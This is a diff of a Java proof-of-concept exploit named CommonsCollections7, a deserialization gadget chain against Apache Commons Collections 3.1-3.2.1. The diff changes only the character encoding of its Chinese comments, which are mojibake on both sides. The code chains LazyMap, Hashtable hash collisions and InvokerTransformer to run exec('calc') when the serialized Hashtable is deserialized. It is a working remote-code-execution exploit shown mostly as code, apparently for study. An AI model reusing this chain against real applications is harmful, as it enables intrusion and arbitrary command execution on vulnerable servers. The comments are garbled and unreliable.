@@ -13,13 +13,13 @@ import java.util.Hashtable;
 import java.util.Map;
 
 /**
- * ²âÊÔ»·¾³£º3.1-3.2.1£¬jdk1.7,1.8
+ * æµ‹è¯•ç¯å¢ƒï¼š3.1-3.2.1ï¼Œjdk1.7,1.8
  *
- * ÕâÀïÈÔÈ»ÊÇÏë·¨×Ó´¥·¢LazyMap.get()¡£Hashtable µÄ readObject ÖĞ.
- * Óöµ½ hash Åö×²Ê±, Í¨¹ıµ÷ÓÃÒ»¸ö¶ÔÏóµÄ equals ·½·¨¶Ô±ÈÁ½¸ö¶ÔÏóÅĞ¶ÏÊÇÕæµÄ hash Åö×².
- * ÕâÀïµÄ equals ·½·¨ÊÇ AbstractMap µÄ equals ·½·¨¡£
+ * è¿™é‡Œä»ç„¶æ˜¯æƒ³æ³•å­è§¦å‘LazyMap.get()ã€‚Hashtable çš„ readObject ä¸­.
+ * é‡åˆ° hash ç¢°æ’æ—¶, é€šè¿‡è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡åˆ¤æ–­æ˜¯çœŸçš„ hash ç¢°æ’.
+ * è¿™é‡Œçš„ equals æ–¹æ³•æ˜¯ AbstractMap çš„ equals æ–¹æ³•ã€‚
  *
- * ÕâÀïÊÇ jdk 1.7 µÄ£¬²»Í¬°æ±¾ HashMap readObject ¿ÉÄÜÂÔÓĞ²»Í¬
+ * è¿™é‡Œæ˜¯ jdk 1.7 çš„ï¼Œä¸åŒç‰ˆæœ¬ HashMap readObject å¯èƒ½ç•¥æœ‰ä¸åŒ
  *   ->Hashtable.readObject()
  *       ->Hashtable.reconstitutionPut()
  *             ->AbstractMapDecorator.equals
@@ -28,7 +28,7 @@ import java.util.Map;
  *                     ->ChainedTransformer.transform()
  *                       ->ConstantTransformer.transform()
  *                         ->InvokerTransformer.transform()
- *                           ->¡­¡­¡­¡­
+ *                           ->â€¦â€¦â€¦â€¦
  */
 public class CommonsCollections7 {
 
@@ -43,11 +43,11 @@ public class CommonsCollections7 {
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
         };
 
-        //ChainedTransformerÊµÀı
-        //ÏÈÉèÖÃ¼ÙµÄ Transformer Êı×é£¬·ÀÖ¹Éú³ÉÊ±Ö´ĞĞÃüÁî
+        //ChainedTransformerå®ä¾‹
+        //å…ˆè®¾ç½®å‡çš„ Transformer æ•°ç»„ï¼Œé˜²æ­¢ç”Ÿæˆæ—¶æ‰§è¡Œå‘½ä»¤
         Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
 
-        //LazyMapÊµÀı
+        //LazyMapå®ä¾‹
         Map innerMap1 = new HashMap();
         Map innerMap2 = new HashMap();
 
@@ -62,22 +62,22 @@ public class CommonsCollections7 {
         hashtable.put(lazyMap2, "test");
 
 
-        //Í¨¹ı·´ÉäÉèÖÃÕæµÄ ransformer Êı×é
+        //é€šè¿‡åå°„è®¾ç½®çœŸçš„ ransformer æ•°ç»„
         Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
         field.setAccessible(true);
         field.set(chainedTransformer, transformers);
 
-        //ÉÏÃæµÄ hashtable.put »áÊ¹µÃ lazyMap2 Ôö¼ÓÒ»¸ö yy=>yy£¬ËùÒÔÕâÀïÒªÒÆ³ı
+        //ä¸Šé¢çš„ hashtable.put ä¼šä½¿å¾— lazyMap2 å¢åŠ ä¸€ä¸ª yy=>yyï¼Œæ‰€ä»¥è¿™é‡Œè¦ç§»é™¤
         lazyMap2.remove("yy");
 
-        //ĞòÁĞ»¯
+        //åºåˆ—åŒ–
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
         oos.writeObject(hashtable);
         oos.flush();
         oos.close();
 
-        //²âÊÔ·´ĞòÁĞ»¯
+        //æµ‹è¯•ååºåˆ—åŒ–
         ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         ois.readObject();
